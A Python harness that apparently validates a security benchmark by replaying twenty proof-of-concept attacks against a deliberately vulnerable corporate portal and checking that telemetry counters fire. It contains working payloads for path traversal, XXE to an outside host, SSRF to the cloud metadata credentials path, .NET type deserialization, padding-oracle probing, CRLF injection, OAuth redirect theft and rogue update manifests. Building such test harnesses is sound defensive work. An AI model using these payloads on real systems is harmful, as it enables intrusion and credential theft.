#!/usr/bin/env python3
"""Replay every catalog PoC for the corporate portal and assert each counter fires once.

This is what stops the corpus from being decorative. An entry that claims a flaw whose
PoC no longer reproduces it is worse than no entry at all: every tool silently loses a
point it could never have won, and "nobody found it" becomes indistinguishable from
"it is hard".

Two assertions per entry, not one:

* the counter fired exactly once. Twice usually means the sink is counting the payload
  rather than the effect, which would hand tools free points.
* the record carried a peer address. The platform's own replay is recognised by SOURCE
  ADDRESS and excluded from every score; a counter raised deep inside the portal that
  lost the request's address on the way arrives looking like organic traffic, and the
  replay below would then be credited to whichever tool happens to be running. That is
  a silent failure, so it is asserted here rather than hoped for.

Identification of this traffic as the platform's own is by source address and by nothing
else. There is no marker header anywhere below: a header would be visible to a tool
through any reflection or header-injection flaw in the portal and would hand it the
shape of the evaluation. Run this from the internal network, whose range the portal
carries in TELEMETRY_SYNTHETIC_CIDRS.

The target must be freshly reset before this runs, and reset again afterwards, because
several of these PoCs change state on purpose (an account is closed, an approval is
withdrawn, files are written outside their store):

    docker compose exec corp-portal /usr/local/bin/state-reset
    ... run this ...
    docker compose exec corp-portal /usr/local/bin/state-reset

The two digests must match.

Usage
-----
    python3 targets/corp/selftest.py                # replay + assertions
    python3 targets/corp/selftest.py --no-collector # replay only

Run it from the internal network, e.g.

    docker run --rm --network bench-internal -v "$PWD:/w" -w /w python:3.12-alpine \\
        python targets/corp/selftest.py

Environment
-----------
    CORP_BASE_URL        default http://portal
    TELEMETRY_ENDPOINT   default http://otel-collector:8900
    CORP_MANIFEST_PORT   default 8099    the port the update manifest is served on
"""

from __future__ import annotations

import base64
import http.client
import http.cookiejar
import http.server
import json
import os
import re
import socket
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

BASE = os.environ.get("CORP_BASE_URL", "http://portal").rstrip("/")
ENDPOINT = os.environ.get("TELEMETRY_ENDPOINT", "http://otel-collector:8900").rstrip("/")
MANIFEST_PORT = int(os.environ.get("CORP_MANIFEST_PORT", "8099"))

CATALOG = Path(__file__).resolve().parents[2] / "catalog" / "vulns"
RUN_TAG = format(int(time.time()) % 100000, "05d")

USER = ("h.abassi@meridian-castings.net", "winter-forge-3318")
OTHER = ("t.novak@meridian-castings.net", "copper-anvil-7741")
ADMIN = ("s.durand@meridian-castings.net", "Foundry-Lane!204")


# ---------------------------------------------------------------------------
# catalog: id -> signal
# ---------------------------------------------------------------------------

def load_signals() -> dict[str, str]:
    """Map catalog id -> oracle.signal without needing a YAML parser.

    The assertions are made on signals because that is all a compliant target emits;
    the catalog is the only place the mapping back to an id exists.
    """
    out: dict[str, str] = {}
    for path in sorted(CATALOG.glob("BENCH-CORP-*.yaml")):
        text = path.read_text()
        ident = re.search(r"^id:\s*(\S+)", text, re.M)
        signal = re.search(r"^\s*signal:\s*(\S+)", text, re.M)
        if ident and signal:
            out[ident.group(1)] = signal.group(1).strip("\"'")
    return out


# ---------------------------------------------------------------------------
# a browser, near enough
# ---------------------------------------------------------------------------

class NoRedirects(urllib.request.HTTPRedirectHandler):
    """Redirects are the effect under test in three entries; never follow one."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):  # noqa: D102
        return None


class Client:
    """One signed-in session, or none."""

    def __init__(self) -> None:
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar), NoRedirects()
        )

    def request(self, method: str, path: str, *, body: bytes | None = None,
                headers: dict[str, str] | None = None) -> tuple[int, bytes, dict[str, str]]:
        url = path if path.startswith("http") else BASE + path
        request = urllib.request.Request(url, data=body, method=method)
        request.add_header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) portal-check")
        for name, value in (headers or {}).items():
            request.add_header(name, value)
        try:
            with self.opener.open(request, timeout=30) as response:
                return response.status, response.read(), dict(response.headers)
        except urllib.error.HTTPError as error:
            return error.code, error.read(), dict(error.headers)
        except (urllib.error.URLError, OSError, http.client.HTTPException) as error:
            # Two entries end their response by faulting part way through it, which is
            # the point; whatever arrived is enough.
            return 0, str(error).encode(), {}

    def get(self, path: str, **kwargs):
        return self.request("GET", path, **kwargs)

    def form(self, path: str, fields: dict[str, str], method: str = "POST"):
        body = urllib.parse.urlencode(fields).encode()
        return self.request(method, path, body=body,
                            headers={"Content-Type": "application/x-www-form-urlencoded"})

    def json_body(self, path: str, document: dict, method: str = "POST"):
        body = json.dumps(document).encode()
        return self.request(method, path, body=body,
                            headers={"Content-Type": "application/json"})

    def cookie(self, name: str) -> str | None:
        for entry in self.jar:
            if entry.name == name:
                return entry.value
        return None

    def set_cookie(self, name: str, value: str) -> None:
        entry = http.cookiejar.Cookie(
            version=0, name=name, value=value, port=None, port_specified=False,
            domain=urllib.parse.urlsplit(BASE).hostname or "portal", domain_specified=False,
            domain_initial_dot=False, path="/", path_specified=True, secure=False,
            expires=None, discard=True, comment=None, comment_url=None, rest={},
        )
        self.jar.set_cookie(entry)

    def drop_cookie(self, name: str) -> None:
        for entry in list(self.jar):
            if entry.name == name:
                self.jar.clear(entry.domain, entry.path, entry.name)

    def sign_in(self, credentials: tuple[str, str]) -> None:
        email, password = credentials
        status, _, _ = self.form("/signin", {
            "email": email, "password": password, "returnUrl": "/workspace",
        })
        if status not in (200, 302):
            raise RuntimeError(f"sign-in for {email} answered {status}")
        if self.cookie("PORTALSESSION") is None:
            raise RuntimeError(f"sign-in for {email} issued no session")


def multipart(fields: dict[str, str], file_field: str, filename: str, payload: bytes) -> tuple[bytes, str]:
    boundary = "----MeridianBoundary" + RUN_TAG
    parts: list[bytes] = []
    for name, value in fields.items():
        parts.append(
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n".encode()
        )
    parts.append(
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"{file_field}\";"
        f" filename=\"{filename}\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode()
    )
    parts.append(payload)
    parts.append(f"\r\n--{boundary}--\r\n".encode())
    return b"".join(parts), "multipart/form-data; boundary=" + boundary


def b64url_decode(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def b64url_encode(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).decode().rstrip("=")


# ---------------------------------------------------------------------------
# a manifest of our own, for the update channel
# ---------------------------------------------------------------------------

class ManifestHandler(http.server.BaseHTTPRequestHandler):
    body = json.dumps({
        "version": "9.9." + RUN_TAG,
        "package_url": "http://updates.invalid/agent-9.9.tar.gz",
        "sha256": "6f" * 32,
        "signature": "",
    }).encode()

    def do_GET(self):  # noqa: N802
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(self.body)))
        self.end_headers()
        self.wfile.write(self.body)

    def log_message(self, *args):  # noqa: D102
        return


def own_address() -> str:
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect((urllib.parse.urlsplit(BASE).hostname or "portal", 80))
        return probe.getsockname()[0]
    except OSError:
        return socket.gethostbyname(socket.gethostname())
    finally:
        probe.close()


# ---------------------------------------------------------------------------
# the replay
# ---------------------------------------------------------------------------

class Replay:
    def __init__(self) -> None:
        self.anon = Client()
        self.user = Client()
        self.other = Client()
        self.admin = Client()

    def prepare(self) -> None:
        self.user.sign_in(USER)
        self.other.sign_in(OTHER)
        self.admin.sign_in(ADMIN)

    # -- anonymous ---------------------------------------------------------

    def poc_0013(self) -> None:
        """The interstitial follows an address that leaves the portal."""
        self.anon.get("/go?to=" + urllib.parse.quote(
            "https://collect-" + RUN_TAG + ".partner-supply.example/x", safe=""))

    def poc_0010(self) -> None:
        """Two answers for one trailing block settle a byte of the record."""
        status, body, _ = self.user.get("/documents")
        tokens = re.findall(rb'/share/([A-Za-z0-9_-]{40,})', body)
        if not tokens:
            raise RuntimeError(f"no share link on /documents (status {status})")
        token = tokens[0].decode()

        good = self.anon.get("/share/" + token)
        if good[0] != 200:
            raise RuntimeError(f"a freshly issued share link answered {good[0]}")

        raw = bytearray(b64url_decode(token))
        # Vary the block in front of the trailing one, which is what a search over the
        # record does, and stop as soon as the answer changes.
        for candidate in range(1, 40):
            mutated = bytearray(raw)
            mutated[16] ^= candidate
            status, _, _ = self.anon.get("/share/" + b64url_encode(bytes(mutated)))
            if status == 400:
                return
        raise RuntimeError("varying the preceding block never produced the other answer")

    def poc_0007(self) -> None:
        """An asset carrying active content is served inline from this origin."""
        name = "site-plan-" + RUN_TAG + ".svg"
        payload = (
            b'<svg xmlns="http://www.w3.org/2000/svg" width="120" height="60">'
            b'<image href="x" onload="fetch(\'/api/account\')" />'
            b'<text x="4" y="20">General arrangement</text></svg>'
        )
        body, content_type = multipart({"title": "General arrangement", "name": name},
                                       "file", name, payload)
        status, _, _ = self.user.request("POST", "/api/documents", body=body,
                                         headers={"Content-Type": content_type})
        if status != 200:
            raise RuntimeError(f"filing the drawing answered {status}")
        served = self.anon.get("/media/" + name)
        if served[0] != 200:
            raise RuntimeError(f"the drawing was not served back ({served[0]})")

    # -- signed in ---------------------------------------------------------

    def poc_0003(self) -> None:
        """An upload lands outside the document store."""
        name = "../../../../tmp/despatch-note-" + RUN_TAG + ".txt"
        body, content_type = multipart({"title": "Despatch note", "name": name},
                                       "file", "despatch-note.txt", b"despatch note\n")
        self.user.request("POST", "/api/documents", body=body,
                          headers={"Content-Type": content_type})

    def poc_0001(self) -> None:
        """The saved arrangement builds a class this application does not define."""
        document = ('{"$type":"System.Collections.Generic.List`1[[System.String,'
                    ' System.Private.CoreLib]], System.Private.CoreLib",'
                    '"$values":["approvals","documents"]}')
        state = base64.b64encode(document.encode()).decode()
        self.user.json_body("/api/workspace/layout", {"state": state})
        # The endpoint also files the blob in the first-paint cookie. Dropped here so
        # that the next entry is exercising the cookie it sets for itself and nothing
        # from this one.
        self.user.drop_cookie("wslayout")

    def poc_0020(self) -> None:
        """The first-paint cookie builds a class this application does not define."""
        document = ('{"$type":"System.Collections.Generic.List`1[[System.String,'
                    ' System.Private.CoreLib]], System.Private.CoreLib",'
                    '"$values":["timesheets"]}')
        self.user.set_cookie("wslayout", base64.b64encode(document.encode()).decode())
        self.user.get("/workspace")
        self.user.drop_cookie("wslayout")

    def poc_0002(self) -> None:
        """A profile save moves a column the page renders no input for."""
        self.user.form("/account/profile", {
            "displayName": "Helen Abassi",
            "telephone": "0114 496 2210",
            "approvalLimit": "500000",
        })

    def poc_0009(self) -> None:
        """A badge presents a role the directory does not hold."""
        crafted = ";role=approver; " + " " * 16
        status, _, _ = self.user.form("/account/profile", {
            "displayName": "Helen Abassi",
            "nickname": crafted,
        })
        if status != 200:
            raise RuntimeError(f"saving the nickname answered {status}")

        badge = self.user.cookie("badge")
        if badge is None:
            raise RuntimeError("no badge was issued")
        blocks = b64url_decode(badge)
        if len(blocks) != 80:
            raise RuntimeError(f"the badge is {len(blocks)} bytes, expected 80")
        spliced = bytearray(blocks)
        spliced[48:64] = blocks[16:32]
        self.user.set_cookie("badge", b64url_encode(bytes(spliced)))
        status, _, _ = self.user.get("/api/approvals/queue")
        if status != 200:
            raise RuntimeError(f"the queue answered {status} to the reordered badge")

    def poc_0005(self) -> None:
        """A render profile becomes structure in the converter's job."""
        self.user.json_body("/api/documents/8801/render",
                            {"profile": "print-a4\r\nX-Spool-Priority: 0"})

    def poc_0016(self) -> None:
        """The handoff answers with a location that leaves the portal."""
        self.user.json_body("/api/documents/handoff", {
            "documentId": 8801,
            "next": "https://collect-" + RUN_TAG + ".partner-supply.example/x",
        })

    def poc_0017(self) -> None:
        """A membership save moves a role the caller may not grant."""
        self.user.json_body("/api/teams/13/members", {
            "memberId": 4102,
            "jobTitle": "Process engineer",
            "role": "owner",
        }, method="PATCH")

    def poc_0004(self) -> None:
        """An approval is withdrawn on a verb the request was not admitted on."""
        self.user.request("POST", "/api/approvals/8870", body=b"",
                          headers={"X-HTTP-Method-Override": "DELETE",
                                   "Content-Type": "application/json"})

    def poc_0012(self) -> None:
        """The detailed page carries frames and the data source settings."""
        self.user.get("/reports/export?format=ods")

    def poc_0015(self) -> None:
        """The export faults after rows from other cost centres were flushed."""
        self.user.get("/api/reports/timesheets?group=" + urllib.parse.quote("site:unknown"))

    def poc_0011(self) -> None:
        """A code is delivered to a host nobody registered."""
        redirect = "https://portal.meridian-castings.net.partner-supply.example/collect"
        self.user.get("/connect/authorize?client_id=equipment-desk&response_type=code"
                      "&state=" + RUN_TAG + "&redirect_uri=" + urllib.parse.quote(redirect, safe=""))

    # -- administration ----------------------------------------------------

    def poc_0006(self) -> None:
        """The extract reader fetches a resource outside the document."""
        host = "extract-" + RUN_TAG + ".payroll-bureau.example"
        extract = (
            '<?xml version="1.0"?>'
            f'<!DOCTYPE staff [<!ENTITY roster SYSTEM "http://{host}/roster.xml">]>'
            '<staff><person><name>&roster;</name></person></staff>'
        )
        self.admin.request("POST", "/api/directory/import", body=extract.encode(),
                           headers={"Content-Type": "application/xml"})

    def poc_0008(self) -> None:
        """The endpoint check reaches the host's own configuration service."""
        self.admin.json_body("/api/integrations/probe", {
            "endpoint": "http://169.254.169.254/latest/meta-data/iam/security-credentials/portal-app-role",
        })

    def poc_0014(self) -> None:
        """An unauthenticated release enters the channel agents collect from."""
        address = own_address()
        server = http.server.ThreadingHTTPServer(("0.0.0.0", MANIFEST_PORT), ManifestHandler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        try:
            self.admin.json_body("/api/agents/updates", {
                "manifest_url": f"http://{address}:{MANIFEST_PORT}/stable.json",
            })
        finally:
            server.shutdown()
            server.server_close()

    def poc_0018(self) -> None:
        """A template save lands outside the template directory."""
        name = "..%252f..%252f..%252f..%252ftmp%252fdespatch-note-" + RUN_TAG + ".txt"
        self.admin.request("PUT", "/api/templates/" + name,
                           body=b"Despatch note for {{order}}\n",
                           headers={"Content-Type": "text/plain"})

    # -- last, because it closes the account it runs against ----------------

    def poc_0019(self) -> None:
        """A destructive operation runs on a verb the request was not admitted on."""
        self.other.form("/account/profile", {
            "displayName": "Tomas Novak",
            "_method": "DELETE",
        })


ORDER = [
    "BENCH-CORP-0013", "BENCH-CORP-0010", "BENCH-CORP-0007", "BENCH-CORP-0003",
    "BENCH-CORP-0001", "BENCH-CORP-0020", "BENCH-CORP-0002", "BENCH-CORP-0009",
    "BENCH-CORP-0005", "BENCH-CORP-0016", "BENCH-CORP-0017", "BENCH-CORP-0004",
    "BENCH-CORP-0012", "BENCH-CORP-0015", "BENCH-CORP-0011", "BENCH-CORP-0006",
    "BENCH-CORP-0008", "BENCH-CORP-0014", "BENCH-CORP-0018", "BENCH-CORP-0019",
]


# ---------------------------------------------------------------------------
# platform API
# ---------------------------------------------------------------------------

def api(method: str, path: str, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    request = urllib.request.Request(ENDPOINT + path, data=data, method=method,
                                     headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(request, timeout=20) as response:
        payload = response.read()
    return json.loads(payload) if payload else None


def main() -> int:
    signals = load_signals()
    missing = [ident for ident in ORDER if ident not in signals]
    if missing:
        print("catalog entries without a signal: " + ", ".join(missing), file=sys.stderr)
        return 2
    if len(signals) != len(ORDER):
        print(f"catalog holds {len(signals)} entries, this replay covers {len(ORDER)}", file=sys.stderr)
        return 2
    by_signal = {signal: ident for ident, signal in signals.items()}

    use_api = "--no-collector" not in sys.argv
    run_id = None
    if use_api:
        try:
            run = api("POST", "/v1/runs", {
                "tool": "release-check",
                "profile": "corp-poc-replay",
                "targets": ["corp"],
                "notes": "targets/corp/selftest.py",
                "force": True,
            })
            run_id = run["run_id"]
            print(f"run {run_id}")
        except (urllib.error.URLError, OSError) as error:
            print(f"cannot reach the platform API at {ENDPOINT}: {error}", file=sys.stderr)
            print("re-run with --no-collector to replay without assertions", file=sys.stderr)
            return 2

    replay = Replay()
    try:
        replay.prepare()
    except Exception as error:  # noqa: BLE001
        print(f"could not sign in: {error}", file=sys.stderr)
        return 2

    failures: list[str] = []
    for ident in ORDER:
        method = getattr(replay, "poc_" + ident.split("-")[-1])
        print(f"  replaying {ident} ... ", end="", flush=True)
        try:
            method()
            print("sent")
        except Exception as error:  # noqa: BLE001
            print(f"FAILED to send: {error}")
            failures.append(ident + " (send)")

    if not use_api:
        print("replay done (no assertions)")
        return 1 if failures else 0

    # The out-of-band entries are joined by the resolver, which reports on its own
    # schedule; give it a moment before the run is closed.
    time.sleep(4)

    api("POST", f"/v1/runs/{run_id}/close")
    page = api("GET", f"/v1/runs/{run_id}/events?type=signal&limit=50000")
    events = page.get("events", []) if isinstance(page, dict) else []

    counts: dict[str, int] = {}
    details: dict[str, str] = {}
    addressless: dict[str, int] = {}
    for event in events:
        record = event.get("payload", event) if isinstance(event.get("payload"), dict) else event
        signal = record.get("signal")
        if not signal:
            continue
        counts[signal] = counts.get(signal, 0) + 1
        if not record.get("peer_ip"):
            addressless[signal] = addressless.get(signal, 0) + 1
        attributes = record.get("attributes") or record.get("evidence") or {}
        if attributes.get("detail") and signal not in details:
            details[signal] = attributes["detail"]

    print()
    for ident in ORDER:
        signal = signals[ident]
        seen = counts.get(signal, 0)
        blind = addressless.get(signal, 0)
        state = "ok  " if seen == 1 and blind == 0 else "FAIL"
        print(f"{state} {ident}  {signal}  count={seen}")
        if signal in details:
            print(f"       {details[signal][:300]}")
        if seen != 1:
            failures.append(ident)
        elif blind:
            print("       the record carried no peer address, so this replay would be scored")
            failures.append(ident + " (no peer address)")

    for signal in sorted(set(counts) - set(by_signal)):
        print(f"FAIL unexpected counter {signal} ({counts[signal]}) - another target's?")
        failures.append(signal)

    print()
    if failures:
        print(f"{len(failures)} of {len(ORDER)} entries did not fire exactly once with an address")
        print("count 0: the flaw was repaired, or the PoC no longer reaches it.")
        print("count >1: something is counting the payload rather than the effect, which "
              "would hand tools free points.")
        print("no peer address: the request context did not reach the sink, so this "
              "replay is indistinguishable from a tool's traffic.")
        return 1

    print(f"all {len(ORDER)} counters fired exactly once, each carrying a peer address")
    print("now run /usr/local/bin/state-reset again; the digest must match the one taken "
          "before this replay")
    return 0


if __name__ == "__main__":
    sys.exit(main())
